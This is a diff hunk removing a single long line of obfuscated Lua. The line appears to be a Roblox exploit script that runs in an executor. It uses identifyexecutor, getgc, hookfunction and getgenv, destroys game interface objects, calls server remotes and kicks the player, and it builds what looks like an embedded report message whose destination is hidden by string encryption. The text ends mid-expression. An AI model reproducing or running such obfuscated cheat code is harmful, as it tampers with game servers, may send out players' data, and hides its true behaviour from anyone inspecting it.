@@ -1,1 +1,449 @@
-return({f=function(w)return function(...)local e,i,g,q,d,u,C,G,R,O,E,B,t,aa,X,S,K,a,W,b,z,J,m,T,n,l,L,j,p,H,Y,P,I,_a,_,D,k,c,s,N,y,o,r,M,x,Q,v,F,h,V,f B=w.ka[-0x1251]or w:ma(0x58ca9,0x30fd,-0x1251)while true do if B>0x9f then if B>0xcd then if B<=0b11100101 then if B>0b11100001 then n,B,k=G[w.ka[0x282f]or w:la(w.V"lY5YV",w.V"8vO",0x282f)],B+0b1101,w.ka[0x54ab]or w:la(w.V"ztkgQ>!QgkbKa=",w.V"suD(^%m",0x54ab)X=n==k elseif B>0xd6 then B,D=0xb892/B,task t=D[w.ka[0x25ae]or w:la(w.V"eOqHr",w.V"Itl",0x25ae)]t()elseif B<=0xd2 then B=_[0b11][_[1]]and(w.ka[-0x5599]or w:ma(0x27159e,0x39d6,-0x5599))or w.ka[-0x76d4]or w:na(0x135d,0x127c,-0x76d4)else B=p and(w.ka[0x6c58]or w:ma(0x3df040,0x631a,0x6c58))or 0x84ea/B end elseif B<=0xf2 then if B<=0b11100111 then u=1 B=f[0b11][f[1]]<u and(w.ka[-0x5fcb]or w:ma(0x449da,0x2bea,-0x5fcb))or w.ka[-0x46da]or w:ma(0x29d220,0x4148,-0x46da)else B=X and B+-0b10111011 or B+-0x83 end else x=table x,o,R=P[0b11][P[1]],x[w.ka[0x5596]or w:la(w.V"jEaPZ",w.V"<LU",0x5596)],l[w.ka[0x4e23]or w:la(w.V"eI;HY",w.V"L^A",0x4e23)]o=o(x,R)B=o and 0x140-B or B+-0x6a end elseif B<=0b10111001 then if B>0b10101101 then if B>0xb7 then a,e=H[0b11][H[1]][w.ka[-0x65bf]or w:la(w.V"RVhTF3U>rSyb56",w.V"Z`dV81p",-0x65bf)],w:i{P,L}a,Q=a.Connect,a a(Q,e)a,e=H[0b11][H[1]][w.ka[-0x65bf]or w:la(w.V"i3)XDd8;RIM0vd",w.V"93T{C*#",-0x65bf)],onPlayerAdded a,Q=a.Connect,a a(Q,e)a=w:q{W,D,P,_a,f}Q=a Q=Q()e,l,J,x,o=I,T[0b11][T[1]],d[0b11][d[1]],w.ka[-0x117c]or w:la(w.V"5{v=8!PmWcA05gi5GZB`jn=Z3#~X#dX`A37d^se%Sn$Ga%`NFeFmOPnjV;l~6pdB7!GOJW7)i``NhC1^+SRs}#u3!zXr8w$em-&N4EL04o_xGZWOEhth$`EZ",w.V"@Z(6hz$HWmd)-X`4yV97+D8aY6w#^*hTtRe^?>BKF;E>S6sa$KLEEzTi!{9<",-0x117c),Q e(J,l,o,x)l,J=w.ka[-0x2404]or w:la(w.V"*Vh",w.V"wE",-0x2404),{}J[w.ka[0x5417]or w:la(w.V"L>*2U",w.V"d?N",0x5417)]=l J[w.ka[0x9f2]or w:la(w.V"6F?>pPCf?",w.V"Um;@",0x9f2)]=Q x,o=true,{}o[w.ka[-0x6dc9]or w:la(w.V"?bxO2+M(<",w.V"#I}e",-0x6dc9)]=x R,S={},_a[0b11][_a[1]][w.ka[-0x12b5]or w:la(w.V"@>sq&VAn{4DPhw",w.V"3`or}wg",-0x12b5)]R[w.ka[-0xc2c]or w:la(w.V"oR$",w.V"_y",-0xc2c)]=S S=_a[0b11][_a[1]][w.ka[0x4e23]or w:la(w.V"iKeQe",w.V"$Hx",0x4e23)]R[w.ka[-0x5592]or w:la(w.V"V|V",w.V"76",-0x5592)]=S S=_a[0b11][_a[1]][w.ka[-0x8df]or w:la(w.V"sSjO_HCz",w.V"IDGs",-0x8df)]R[w.ka[-0x824]or w:la(w.V"*UQE",w.V"q5",-0x824)]=S R[w.ka[-0x246e]or w:la(w.V"i<S",w.V"?f",-0x246e)]=W[0b11][W[1]]R[w.ka[-0x38cb]or w:la(w.V"wxzT",w.V"!~",-0x38cb)]=f[0b11][f[1]]S=#D[0b11][D[1]]R[w.ka[-0x6f8b]or w:la(w.V"R6$r+P5",w.V"H9Y",-0x6f8b)]=S x=R o[w.ka[0x6c02]or w:la(w.V"F@qt4",w.V";#B",0x6c02)]=x l=o J[w.ka[0xd2d]or w:la(w.V"?RyXLXAS",w.V"Z4R9",0xd2d)]=l e=J e={[1]=0b10,[0b10]=e}e[0b11]=e l,J=w:j{s,d,e,T,K},pcall J(l)l=task l,J=1,l[w.ka[0x25ae]or w:la(w.V"M5<c9",w.V"%QF",0x25ae)]J(l)l,J,o=_a[0b11][_a[1]],_a[0b11][_a[1]].Kick,w.ka[-0x6cbe]or w:la(w.V"An$%cfKY(byi$yxIXNgNVEocX*3*)v)?NhgY!RIsg_?|Bk)3^HJ1-;dmrsq&*}(V`HU",w.V"DxZenrnx`znG8r=N*V9|J^%CJJK-@OonZ",-0x6cbe)J(l,o)return else t,E,D=getgc,ipairs,true t=w.c(t(D))E,t,D=E(w.d(t))E,t,D=w.b(E,t,D)f,u=E(t,D)D=f B=D==nil and B+-0b11100 or w.ka[-0xb0e]or w:ma(0x173e8c,0x38ac,-0xb0e)end elseif B>=0xa4 then if B>0xa4 then B,g=0b101001100-B,N[0b11][N[1]]else u={[1]=0b10,[0b10]=u}u[0b11]=u u[0b11][u[1]]=w:D{r}G={[1]=0b10,[0b10]=G}G[0b11]=G G[0b11][G[1]]=w:B{r,u}X={[1]=0b10,[0b10]=X}X[0b11]=X X[0b11][X[1]]=w:v{r}n={[1]=0b10,[0b10]=n}n[0b11]=n n[0b11][n[1]]=w:s{p,X}k={[1]=0b10,[0b10]=k}k[0b11]=k k[0b11][k[1]]=w:n{p,X}O={[1]=0b10,[0b10]=O}O[0b11]=O O[0b11][O[1]]=w:x{p,H}b={[1]=0b10,[0b10]=b}b[0b11]=b b[0b11][b[1]]=w:l{r,p}z={[1]=0b10,[0b10]=z}z[0b11]=z z[0b11][z[1]]=w:E{O,X,b,n,p,G,k,t}L={[1]=0b10,[0b10]=L}L[0b11]=L L[0b11][L[1]],Q,a=w:w{z},H[0b11][H[1]],H[0b11][H[1]].GetPlayers a,Q,e=a(Q)a,Q,e=w.b(a,Q,e)J,l=a(Q,e)e=J B=e==nil and B+0b10101 or B+0b1011011 end else B,p,q=B+0x17,nil,false q={[1]=0b10,[0b10]=q}q[0b11]=q end elseif B>0b11000011 then D,t,E=w:g{_,N,q},p,hookfunction B,E=w.ka[-0x76d4]or w:ma(0x555294,0x6114,-0x76d4),E(t,D)elseif B>0b10111101 then y={[1]=0b10,[0b10]=y}y[0b11]=y y[0b11][y[1]]=w:u()j={[1]=0b10,[0b10]=j}j[0b11]=j j[0b11][j[1]]=w:r()F={[1]=0b10,[0b10]=F}F[0b11]=F F[0b11][F[1]]=w:o()V={[1]=0b10,[0b10]=V}V[0b11]=V V[0b11][V[1]]=w:p()m={[1]=0b10,[0b10]=m}m[0b11]=m m[0b11][m[1]]=w:h{F}Y={[1]=0b10,[0b10]=Y}Y[0b11]=Y Y[0b11][Y[1]]=w:z()h={[1]=0b10,[0b10]=h}h[0b11]=h h[0b11][h[1]]=w:A()c={[1]=0b10,[0b10]=c}c[0b11]=c c[0b11][c[1]]=w:k{y,s,h,j,m,Y,V}g,I=getgenv,w:C{s,K,c}g=g()g[w.ka[-0b101110001]or w:la(w.V"zn&+IvJe",w.V"blm9",-0b101110001)]=I N=game _,g=N,N[w.ka[-0x37ea]or w:la(w.V"!tm<W>;",w.V"pNI",-0x37ea)]N=_[w.ka[-0x37ea]or w:la(w.V"iZG%Uqy",w.V"U%&",-0x37ea)]N={[1]=0b10,[0b10]=N}N[0b11]=N _=false _={[1]=0b10,[0b10]=_}_[0b11]=_ p=identifyexecutor B=p and(w.ka[0x561b]or w:na(0x706f,0x7020,0x561b))or B+0x13 elseif B<=0b10111010 then X=debug G,X=X[w.ka[0x46b2]or w:la(w.V"_nzzdmHGb",w.V"pZky",0x46b2)],u G=G(X)X=G B=X and 0x19f-B or w.ka[0x4f2c]or w:ma(0x2b5084,0x2dd2,0x4f2c)else B,O=w.ka[0x5e31]or w:na(0x2ca4,0x2c86,0x5e31),k[w.ka[-0x38cb]or w:la(w.V"pNyR",w.V"?E",-0x38cb)]f[0b11][f[1]]=f[0b11][f[1]]+O end elseif B>=0x41 then if B<=0x6f then if B>0x67 then if B<=0b1101001 then G,X=typeof,u G=G(X)X=w.ka[0x7553]or w:la(w.V"qi(qev2wTy",w.V"WY-(T",0x7553)B=G==X and(w.ka[-0x7270]or w:ma(0x30dd3a,0x4341,-0x7270))or 0xd8-B else f,u=E(t,D)D=f B=D==nil and 0x4335/B or w.ka[-0xb0e]or w:na(0x4383,0x431a,-0xb0e)end elseif B>=0x4f then if B>0b1001111 then v=true i[w.ka[0x22c4]or w:la(w.V"c47",w.V"AO",0x22c4)]=v s,v=w.ka[-0x1f27]or w:la(w.V"7DhmRR=I8#AxC3oP^fMNAp",w.V"Vh`Fs5-=k~",-0x1f27),game H,v=v,v.GetService v=v(H,s)v={[1]=0b10,[0b10]=v}v[0b11]=v _a,H=w.ka[0x389c]or w:la(w.V"ZVPEg0(wm",w.V"2xmS",0x389c),game H,s=H.GetService,H H=H(s,_a)H={[1]=0b10,[0b10]=H}H[0b11]=H s,r=game,w.ka[-0x3307]or w:la(w.V"v#k{?#Gb1cGW4D",w.V"ms?@k`v",-0x3307)_a,s=s,s.GetService s=s(_a,r)s={[1]=0b10,[0b10]=s}s[0b11]=s _a=H[0b11][H[1]][w.ka[0x6447]or w:la(w.V";p?eI?fvMhUF6>",w.V"fh5X=tp",0x6447)]_a={[1]=0b10,[0b10]=_a}_a[0b11]=_a T,r,C,M=0b1010,_a[0b11][_a[1]].WaitForChild,_a[0b11][_a[1]],w.ka[0x4d71]or w:la(w.V"aW)JiL?|jRNB",w.V"T5Vb(",0x4d71)r=r(C,M,T)r={[1]=0b10,[0b10]=r}r[0b11]=r C=v[0b11][v[1]][w.ka[-0x474c]or w:la(w.V"ib0Igt4*8T",w.V"r0*oz",-0x474c)]M=C[w.ka[0x2fb9]or w:la(w.V"v<I7Jje{qEY?qP",w.V"`3d%7<^",0x2fb9)]M,T=M.Destroy,M M(T)M=C[""]M,T=M.Destroy,M M(T)M,T=C.Destroy,C M(T)P=_a[0b11][_a[1]][w.ka[-0xed6]or w:la(w.V"P2Of*ZZ}TRbxnIQZU",w.V"MGGVcvK;",-0xed6)]T=P[w.ka[-0x4ea8]or w:la(w.V"d*s<&=EM",w.V"u!uM",-0x4ea8)]M=T[w.ka[-0x27b]or w:la(w.V"qMNH6O(mt4xE4hvlm",w.V"KrVIN{^k",-0x27b)]M,T=M.Destroy,M M(T)T=i[w.ka[0x649d]or w:la(w.V"R6301S~r#NQU",w.V"rqg*9",0x649d)]M=not T B=M and(w.ka[0x3d3e]or w:na(0x55f1,0x55e2,0x3d3e))or B+-0b1000011 else q=identifyexecutor q=q()B,E=w.ka[0xb63]or w:na(0x4efb,0x4e25,0xb63),w.ka[-0x2527]or w:la(w.V"q?C+>fd",w.V"@!$",-0x2527)p=q==E end else x,B,o=1,w.ka[0x70d2]or w:na(0xa99,0xa04,0x70d2),wait o(x)o,x=L[0b11][L[1]],l[w.ka[0x4e23]or w:la(w.V"xfq%p",w.V"dG`",0x4e23)]o(x)end elseif B<=0b10011011 then if B>0b10010101 then t=task B,t,E=B+-0x60,0.5,t[w.ka[0x25ae]or w:la(w.V"aqe&X",w.V"j|K",0x25ae)]E(t)elseif B<=0b10001100 then return else J,l=a(Q,e)e=J B=e==nil and B+0x24 or w.ka[0x2397]or w:ma(0x584760,0x58a0,0x2397)end else t=v[0b11][v[1]][w.ka[-0x3a0]or w:la(w.V">}i(f-EWZo",w.V"jr9n;",-0x3a0)]E=t[w.ka[-0x230c]or w:la(w.V"VlW_C95w",w.V"PI)~",-0x230c)]q=E[w.ka[-0x5260]or w:la(w.V"S`G^bwQ~6?)^-dF8i6dnc#|0",w.V"y-AQ9!ESD1DF",-0x5260)]p=q[w.ka[0x6909]or w:la(w.V"9~1=",w.V"aR",0x6909)]p={[1]=0b10,[0b10]=p}p[0b11]=p t,q=v[0b11][v[1]][w.ka[-0x6263]or w:la(w.V"Yo>HIN=K!3CrVo",w.V"I6@l9C;",-0x6263)],require E=t[w.ka[0x798c]or w:la(w.V"-L{?Wt&;8",w.V"{KSa",0x798c)]E=E[w.ka[-0x184b]or w:la(w.V"X?oY@(UMO|=*iNVNd",w.V"{Jy1!J39",-0x184b)]q=q(E)q={[1]=0b10,[0b10]=q}q[0b11]=q E,D,t=p[0b11][p[1]].WaitForChild,w.ka[0x31dd]or w:la(w.V"f7>1}6b@jzdTRpCR1Y-@aHoA@N&",w.V"3>4D@Z)STjoh<",0x31dd),p[0b11][p[1]]E=E(t,D)f,D,t,E=w.ka[-0x4461]or w:la(w.V"l_gN|sXSZe",w.V"gEdpo",-0x4461),w.ka[0x10ce]or w:la(w.V"L7}8vDe`5!y;d#Ma{",w.V"pk6b`%>V",0x10ce),E,E.InvokeServer E(t,D,f)t,D,E=p[0b11][p[1]],w.ka[0x31dd]or w:la(w.V">xJ6*JT4p#NMV+ckk}n63=>ai-T",w.V"1}0~CPfo1$!?^",0x31dd),p[0b11][p[1]].WaitForChild E=E(t,D)D,t,f,E=w.ka[-0x1a2d]or w:la(w.V"mdTyj-08N(mfHIDxc",w.V"hn24Qpuh",-0x1a2d),E,w.ka[0x2189]or w:la(w.V"REBhn",w.V"=^6",0x2189),E.InvokeServer E(t,D,f)E={[1]=0b10,[0b10]=E}E[0b11]=E E[0b11][E[1]]=w:m{q}t={[1]=0b10,[0b10]=t}t[0b11]=t t[0b11][t[1]]=w:t{v,E}D=t[0b11][t[1]]D=D()D={[1]=0b10,[0b10]=D}D[0b11]=D f=0 f={[1]=0b10,[0b10]=f}f[0b11]=f u,G=ipairs,D[0b11][D[1]]u,G,X=u(G)u,G,X=w.b(u,G,X)n,k=u(G,X)X=n B=X==nil and(w.ka[0x6508]or w:na(0x433c,0x4255,0x6508))or B+0b11110 end elseif B>0x24 then if B<=0b110111 then if B<=0x28 then return else B,p=w.ka[-0x498e]or w:na(0x19b7,0x191c,-0x498e),u end else B=p and 0x2f3f/B or 0x2a2d/B end elseif B<0x1d then if B<=0b1111 then M,T=warn,w.ka[-0x407c]or w:la(w.V"K=9Jj?~LKnf5YOgsj2+HZv",w.V"vyQ;ej*zAs",-0x407c)M(T)return else G,u,B,X=_a[0b11][_a[1]],_a[0b11][_a[1]].Kick,w.ka[-0x46da]or w:na(0x5708,0x5664,-0x46da),w.ka[-0x2d8b]or w:la(w.V"QBPELn+<uMif7h7TplZ+Kp`+gSvrpmV#<eb)^Sf!XuC%?WB",w.V"STfWLGA>c174N<cW9}L^ED!",-0x2d8b)u(G,X)end elseif B<=0b11110 then if B<=0b11101 then i=_G v=i[w.ka[0x22c4]or w:la(w.V"erf",w.V"C;",0x22c4)]B=v and(w.ka[-0x772f]or w:ma(0x64f78,0xb8a,-0x772f))or w.ka[-0x377a]or w:ma(0xa9c39,0x1a5f,-0x377a)else n,k=u(G,X)X=n B=X==nil and(w.ka[0x6508]or w:na(0x3df1,0x3d0a,0x6508))or w.ka[-0x4553]or w:na(0xf32,0xe75,-0x4553)end else M=i[w.ka[0x649d]or w:la(w.V"DkSyrBq{9rEC",w.V"v#Mun",0x649d)]T=M[w.ka[0xafe]or w:la(w.V"AZhOOPdI1u^+W",w.V"0KBX$cK",0xafe)]T={[1]=0b10,[0b10]=T}T[0b11]=T P=M[w.ka[0x283e]or w:la(w.V"mS7`OjdCkQkN",w.V"0cJD9",0x283e)]P={[1]=0b10,[0b10]=P}P[0b11]=P d=M[w.ka[0x670e]or w:la(w.V"u-^PkxzpxGtN",w.V"6tj%r",0x670e)]d={[1]=0b10,[0b10]=d}d[0b11]=d aa=w:y()K=aa K,W=K()K={[1]=0b10,[0b10]=K}K[0b11]=K W={[1]=0b10,[0b10]=W}W[0b11]=W y=not K[0b11][K[1]]B=y and B+0b100 or w.ka[-0x369f]or w:na(0x1545,0x1482,-0x369f)end end end end,c=function(...)return{[1]={...},[0b10]=select("#",...)}end,q=function(w,b)return function()local _,g,r,c,l,e,o,j,i,n,d,k,m,s,p,q,f,t,v,u _=w.ka[0x7c3b]or w:ma(0x5fe10b,0x6b2f,0x7c3b)while true do if _<0x7f then if _<0b1100100 then if _>=0b1000100 then if _>0x44 then return n else s={}f,s,k=s,1,math p,e,k=k[w.ka[-0x2ee9]or w:la(w.V"ML|X",w.V"C;",-0x2ee9)],b[0b10][0b11][b[0b10][1]],0b101 e=#e p=p(k,e)r,n=1,p _=(n~=n or r>0 and s>n or(r<=0 or r~=r)and s<n)and(w.ka[0x3c63]or w:na(0x16c6,0x1642,0x3c63))or 0b11000110-_ end elseif _>0b111 then _,r=w.ka[-0x7a56]or w:na(0x3bff,0x3bad,-0x7a56),w.ka[-0x1b51]or w:la(w.V"ta(mwtrw}Ei9B{th)#~UxB",w.V"@y2f76*wI1",-0x1b51)n[w.ka[-0x5383]or w:la(w.V"JxHo5LaHh",w.V"#3x<",-0x5383)]=r else _,c=0b1110000-_,w.ka[-0x36c1]or w:la(w.V"euaLI",w.V">JR",-0x36c1)end elseif _>=0x69 then if _>0b1101001 then f=0x2710 _=i>=f and 0x3d84/_ or 0x672c/_ else q[w.ka[0x7d4d]or w:la(w.V"{+i^D?E",w.V"`-l",0x7d4d)]=c c=false q[w.ka[0x5088]or w:la(w.V"Sb`8(f*A",w.V"eC#m",0x5088)]=c d=q p[1],p[0b10],p[0b11],p[0b100]=k,e,g,d r=p n[w.ka[0x3692]or w:la(w.V"p}d%@v5o",w.V"{nf_",0x3692)]=r k,p=w.ka[-0xa57]or w:la(w.V"58uwFsqEKQlolSn<0h*YmubI*)AWa)GL6f;yX4sfvsVkM>;;=vw|udLlJc6&J^",w.V"zV(s6<=P#@H|b=<&1`wscD9Ge)vv8i",-0xa57),{}p[w.ka[0x4c36]or w:la(w.V"dSZ5S",w.V"2Mz",0x4c36)]=k r=p n[w.ka[-0x64d6]or w:la(w.V"MtO-;bCd",w.V"<`y6",-0x64d6)]=r p=os p,r=w.ka[-0x2b92]or w:la(w.V"><!8+LVs)`oS6;VJ3?Q3BCD4",w.V"_y<7}X91Ha%>",-0x2b92),p[w.ka[0x3f3c]or w:la(w.V"rVX|U",w.V"Y{C",0x3f3c)]r=r(p)n[w.ka[-0x7eff]or w:la(w.V"rAm|ZqF0~%p#",w.V"k^Upm",-0x7eff)]=r s,r,p=n,{},w.ka[0x5591]or w:la(w.V"Hg+Bk;q?|IJQDKm",w.V"o`8LS1a|",0x5591)r[w.ka[0x40e6]or w:la(w.V"NKk>9Q$mT3",w.V">*OOn",0x40e6)]=p p=w.ka[0x87c]or w:la(w.V"0rXYRwUj=+D1z5E9w(RxtLyN9A+seRCoBcU5h^=4|4gCbWh;=Wd9?ht{plL87?115aN#n{!D<*ijSIi(>VY)wG%GJFPs0FZJS4piul;{)ouzfYptAVl",w.V"g^1XW(Gtq>LlKnDW0F@`1ZAsWSV>Ms!9??giQZuBPI(xh<64ptuExJ1fN1",0x87c)r[w.ka[-0x7f38]or w:la(w.V"=FcgS6!qpkml*",w.V"b>&F8hX",-0x7f38)]=p k,e={},s k[1]=e p=k r[w.ka[0x3146]or w:la(w.V"ggNzuFys",w.V"msH^",0x3146)]=p n,r=r,0b1100100 _=i>=r and _+-0b1001011 or 0xbb-_ end elseif _>0b1100100 then _,v=0x1b18/_,w.ka[0x56f6]or w:la(w.V"-lJyLqi_",w.V"HSL!",0x56f6)else f,v=0xf4240,w.ka[0x5d29]or w:la(w.V"vyg}",w.V"{{",0x5d29)_=i>=f and(w.ka[-0x2dbf]or w:ma(0x169026,0x38a1,-0x2dbf))or 0b11100000-_ end elseif _<=0b11010101 then if _<=0b10000100 then if _>0b10000010 then r,n=w.ka[0x882]or w:la(w.V"tB6vmg6&tzsYkzp>Qk5",w.V"HiqNcGy3W",0x882),{}n[w.ka[0x4200]or w:la(w.V"dUtwqYX",w.V"9u5",0x4200)]=r r=0xcc0000 n[w.ka[0x6be4]or w:la(w.V"$XUl(*#",w.V"Hmd",0x6be4)]=r e,d,p=w.ka[-0x671d]or w:la(w.V"Ayb5XYem#5Y7#Gt$}^#}xQjvjLrgqBq|^U8PoH@;3zKkg2R6jfFzmLvk_h?}RA4f*`~P$",w.V"o3g=I6Co_0Z}ZpR!(6zfSY;gr`+pb>@Fz(",-0x671d),b[0b100][0b11][b[0b100][1]],{}g=d[w.ka[-0x8df]or w:la(w.V"<jd;A@#_",w.V"kGQb",-0x8df)]k=e..g p[w.ka[-0x560e]or w:la(w.V"X>M=",w.V"8~",-0x560e)]=k r=p n[w.ka[0x4353]or w:la(w.V"3K!i`91+P?5&",w.V"Jg9$u",0x4353)]=r p,e,g={},{},w.ka[0x32ad]or w:la(w.V"l$a~Fm?Z",w.V"Nb$k",0x32ad)e[w.ka[0x282f]or w:la(w.V"-p}33",w.V"uCM",0x282f)]=g q=d c,d,j=w.ka[-0x2b68]or w:la(w.V"&V&",w.V"!~",-0x2b68),q[w.ka[-0x12b5]or w:la(w.V"blU(;2vN&DTnSY",w.V"WIc1TFa",-0x12b5)],q u,t,m=j[w.ka[0x4e23]or w:la(w.V"Pi$;x",w.V"4FL",0x4e23)],w.ka[0x30b9]or w:la(w.V"H}iRb",w.V"x;+",0x30b9),q l=m[w.ka[-0x8df]or w:la(w.V"T0vrcdt(",w.V"2Qm)",-0x8df)]j=t..l o=u..j q=c..o g=d..q e[w.ka[0x7d4d]or w:la(w.V"&Xv@G-2",w.V"^tb",0x7d4d)]=g g=true e[w.ka[0x5088]or w:la(w.V"sG+u~p}z",w.V"+Rwo",0x5088)]=g d,k,g=w.ka[0x4483]or w:la(w.V"08(EkPC)",w.V"EGtt",0x4483),e,{}g[w.ka[0x282f]or w:la(w.V"F4-;J",w.V"xIh",0x282f)]=d j,m,q,l,o=w.ka[-0x2eb7]or w:la(w.V"ejS(+9XXf-P5",w.V"as5wp",-0x2eb7),w.ka[-0x6d98]or w:la(w.V"`@yfpxuy",w.V"m6!1",-0x6d98),w.ka[-0x30be]or w:la(w.V"KvQu;a9?{;KL",w.V"AQUSF",-0x30be),b[0b11][0b11][b[0b11][1]],b[1][0b11][b[1][1]]t=l..m u=j..t c=o..u d=q..c g[w.ka[0x7d4d]or w:la(w.V"q8Ydiu>",w.V"c+>",0x7d4d)]=d d=true g[w.ka[0x5088]or w:la(w.V"lgsUs%j5",w.V"fu;H",0x5088)]=d d,e,q={},g,w.ka[0b100110111]or w:la(w.V"Xoi+cf{6",w.V"`sY3",0b100110111)d[w.ka[0x282f]or w:la(w.V"xEi}2",w.V"d)5",0x282f)]=q c,l,j=w.ka[-0x8f1]or w:la(w.V"9)27J",w.V"KTH",-0x8f1),b[0b10][0b11][b[0b10][1]],w.ka[0x5741]or w:la(w.V"BX%52QX3N",w.V"Xg?_",0x5741)t=#l u=j..t o=i..u q=c..o d[w.ka[0x7d4d]or w:la(w.V"UeH9uO#",w.V"u_y",0x7d4d)]=q q=true d[w.ka[0x5088]or w:la(w.V"_SxU|+13",w.V"v$vl",0x5088)]=q c,g,q=w.ka[0xd61]or w:la(w.V"(sXet&u?U8^#",w.V"2>~01",0xd61),d,{}q[w.ka[0x282f]or w:la(w.V"dq8+Z",w.V"Ar$",0x282f)]=c o=table o,c,u=f,o[w.ka[-0x7ac5]or w:la(w.V"T(T})yfg",w.V"K;1t",-0x7ac5)],"\n"c=c(o,u)_=c and(w.ka[-0xb0e]or w:ma(0x2dc62a,0x6f9a,-0xb0e))or 0x39c/_ elseif _<=0x7f then _,v=w.ka[0x3364]or w:na(0x3935,0x38f1,0x3364),w.ka[-0x6c82]or w:la(w.V"P+L_",w.V"5&",-0x6c82)else k=table e,c,k,p=w.ka[-0x7369]or w:la(w.V"9eH`q",w.V"?*9",-0x7369),b[0b10][0b11][b[0b10][1]],f,k[w.ka[0x3122]or w:la(w.V"?+3l(8@d",w.V"&S{1",0x3122)]q=c[s]o,c,d=0x14,1,q[w.ka[0x282f]or w:la(w.V"dLwx!",w.V"LKF",0x282f)]q,d=d,d.sub d=d(q,c,o)c,j=w.ka[0x15d0]or w:la(w.V"*~8f",w.V"`2",0x15d0),b[0b10][0b11][b[0b10][1]]u=j[s]o=u[w.ka[-0x38cb]or w:la(w.V"osOR",w.V"?*",-0x38cb)]q=c..o g=d..q e=e..g _=0x4696/_ p(k,e)end elseif _<=0b10001011 then s=s+r _=(r>0 and s>n or r<=0 and s<n or r~=r)and _+-0b111 or 0x4696/_ else f=0x3e8 _=i>=f and 0xc885/_ or w.ka[0x3364]or w:ma(0x450bc,0x103f,0x3364)end elseif _>0b11110001 then _,i=w.ka[-0x7e17]or w:ma(0x1253cc,0x2eeb,-0x7e17),0 elseif _>0b11100101 then _,v=w.ka[0x3364]or w:ma(0x104478,0x3d3e,0x3364),w.ka[-0x2f60]or w:la(w.V"nqabP",w.V"58V",-0x2f60)else i,v=tonumber,b[0b101][0b11][b[0b101][1]]i=i(v)_=i and(w.ka[-0x7e17]or w:na(0x3335,0x32d1,-0x7e17))or w.ka[-0x2778]or w:ma(0x21198c,0x2272,-0x2778)end end end end,s=function(e,b)return function()local _,a,f,c _=e.ka[-0x2a57]or e:na(0x167a,0x15f4,-0x2a57)while true do if _>0b10100000 then a=b[0b10][0b11][b[0b10][1]]a=a()c=not a _=c and(e.ka[-0x749b]or e:ma(0x13fd8,0x3ff8,-0x749b))or e.ka[0x6c58]or e:na(0xa7c,0x9dc,0x6c58)elseif _<=0x86 then if _>0b101 then _=e.ka[0x6c58]or e:ma(0x118e60,0x1c17,0x6c58)else return end else f,c=e.ka[0x1bf9]or e:la(e.V"+u48V{11j9faKZA{yyI80=7Dj=aT",e.V"_Ji(7;%<(;P@jn",0x1bf9),b[1][0b11][b[1][1]]c,a=c.WaitForChild,c c=c(a,f)c,a=c.InvokeServer,c c(a)a=task c=a[e.ka[0x25ae]or e:la(e.V"SMo{c",e.V"lOO",0x25ae)]_=e.ka[-0x6de7]or e:na(0x692e,0x684b,-0x6de7)c()end end end end,l=function(h,b)return function()local g,i,_,d,j,f,c,a _=h.ka[-0x54f8]or h:na(0x58b7,0x57f1,-0x54f8)while true do if _>=0xc6 then if _>0xc6 then f,d=b[0b10][0b11][b[0b10][1]],h.ka[-0x129a]or h:la(h.V"n47tYMZ~3{5L~ls;;xDLwo=QooDpyCOX9B",h.V"hANype#pV4H{F)q$^",-0x129a)f,g=f.WaitForChild,f f=f(g,d)d,g,f=a,f,f.InvokeServer _=h.ka[0x3a40]or h:na(0x3106,0x30b8,0x3a40)f(g,d)else c=b[1][0b11][b[1][1]]j=c[h.ka[-0x2418]or h:la(h.V"NZi&$LGpRu!bMlq",h.V"pd=u-t{e",-0x2418)]d=j[h.ka[-0x14e2]or h:la(h.V"?p?}K",h.V"Jfi",-0x14e2)]g=d[h.ka[-0x4a46]or h:la(h.V"ayCZMR4rH9",h.V"qclS?",-0x4a46)]f=g[h.ka[0x7eaa]or h:la(h.V"PfKM=e*",h.V"Bn$",0x7eaa)]a=f[h.ka[0x33d6]or h:la(h.V"F1r63x#R",h.V"kk@Y",0x33d6)]g,f,i="",",",a[h.ka[-0x5a9a]or h:la(h.V"qmqw<",h.V"_xA",-0x5a9a)]a,i=i,i.gsub i=i(a,f,g)a,f=tonumber,i a=a(f)_=a and(h.ka[-0x9fc]or h:na(0x587b,0x578f,-0x9fc))or h.ka[0x3a40]or h:ma(0x12ef94,0x3e26,0x3a40)end else return end end end end,K=function(h,b)return function(i)local s,r,e,l,k,q,g,c,t,p,j,v,o,d,u,f,n,_ _=h.ka[0x50c0]or h:ma(0x1d14e7,0x40bd,0x50c0)repeat if _>0x73 then if _>0b10110110 then if _>=0xe1 then if _<0b11101110 then g=bit32 c,g,e=math,k[1],g[h.ka[-0x5f65]or h:la(h.V"$^pj<",h.V"d8h",-0x5f65)]_,q,o=h.ka[-0x2cf6]or h:ma(0x5512c0,0x72a0,-0x2cf6),c[h.ka[0x6f8b]or h:la(h.V"35WoT9R",h.V"<Zl",0x6f8b)],1 o,c=0b1000,n-o c=c/o q=q(c)c=1 d=q+c d=v[d]e=e(g,d)k[1]=e elseif _>0b11101110 then return s else e=e+d _=(d>0 and e>g or d<=0 and e<g or d~=d)and(h.ka[0x1576]or h:na(0x7738,0x770f,0x1576))or 0x6ea2/_ end elseif _>0b10111110 then n=n+p _=(p>0 and n>r or p<=0 and n<r or p~=p)and(h.ka[-0x5a00]or h:na(0x162d,0x1533,-0x5a00))or 0x145-_ else d=1 g,d=n-d,0b1000 e,g=g%d,0b100 _=e==g and(h.ka[0x3263]or h:ma(0xd6ef8,0x15c4,0x3263))or h.ka[-0xdaf]or h:na(0x50bc,0x504f,-0xdaf)end elseif _<=0b10011110 then if _<0x8c then if _>0b1110111 then e={}e,g,k=1,0b100,e d=e _=(g~=g or d>0 and e>g or(d<=0 or d~=d)and e<g)and(h.ka[0x1576]or h:ma(0x142f1f,0x7e07,0x1576))or 0x3b80/_ else j=0b10 j,u=0b100,n-j o=u*j c=o+e q=s[c]_,k[e]=h.ka[0x7c6c]or h:ma(0x67ca78,0x6fa4,0x7c6c),q end elseif _>0x8c then g,e=0b100,1 d=e _=(g~=g or d>0 and e>g or(d<=0 or d~=d)and e<g)and(h.ka[-0xdaf]or h:ma(0x1ee9ff,0x489b,-0xdaf))or _+-0b1011001 else e=e+d _=(d>0 and e>g or d<=0 and e<g or d~=d)and _+-0x1f or h.ka[0x68bf]or h:ma(0x210cdb,0x7a9f,0x68bf)end elseif _>=0xb1 then if _>0xb1 then n=n+p _=(p>0 and n>r or p<=0 and n<r or p~=p)and(h.ka[0x1d06]or h:ma(0x54062,0x15af,0x1d06))or 0x7dd6/_ else k,e=1,0b100 g=k _=(e~=e or g>0 and k>e 